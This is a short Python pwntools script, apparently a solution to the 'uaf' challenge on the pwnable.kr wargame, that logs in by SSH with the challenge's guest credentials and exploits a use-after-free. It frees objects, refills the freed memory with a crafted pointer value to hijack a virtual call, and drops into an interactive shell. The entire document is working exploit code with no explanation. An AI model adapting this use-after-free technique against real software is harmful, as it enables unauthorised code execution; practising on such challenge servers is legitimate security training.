from pwn import *
conn = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
p = conn.process(["./uaf", "24", "/dev/stdin"])
p.recv(512)
p.sendline("3")
p.recv(512)
p.sendline("2")
p.send("\x68\x15\x40\x00\x00\x00\x00\x00")
p.recv(512)
p.sendline("2")
p.send("\x68\x15\x40\x00\x00\x00\x00\x00")
p.recv(512)
p.sendline("1")
p.interactive()